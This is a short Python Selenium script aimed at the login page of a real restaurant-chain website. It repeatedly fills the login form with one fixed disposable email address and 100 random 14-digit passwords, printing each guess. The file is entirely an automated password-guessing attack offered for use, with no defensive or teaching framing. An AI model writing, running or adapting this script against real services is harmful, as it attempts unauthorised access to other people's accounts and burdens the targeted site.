from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import random
import time


url = "https://www.pizzahut.cl/usuario/inicio"


driver = webdriver.Chrome("/Users/Pedro/Downloads/chromedriver_win32 (1)/chromedriver.exe")
driver = webdriver.Chrome("/Users/Pedro/Downloads/chromedriver_win32 (1)/chromedriver.exe")
driver.maximize_window()
email="croinnuteyeijou-5575@yopmail.com"
driver.get(url)
driver.get(url)
for i in range(100):
    list1 = [2, 3, 4, 5, 6]
    clave=""
    for z in range(14):
        a=random.choice(list1)
        clave = f"{clave}{a}"
    print(clave)
    driver.find_element(By.XPATH ,'//*[@id="EmailLogin"]').send_keys(email)
    driver.find_element(By.XPATH ,'//*[@id="PasswordLogin"]').send_keys(clave)
    driver.find_element(By.XPATH ,'//*[@id="btLogin"]/span').click()
    time.sleep(5)
    driver.find_element(By.XPATH ,'//*[@id="EmailLogin"]').send_keys("")
    driver.find_element(By.XPATH ,'//*[@id="PasswordLogin"]').send_keys("")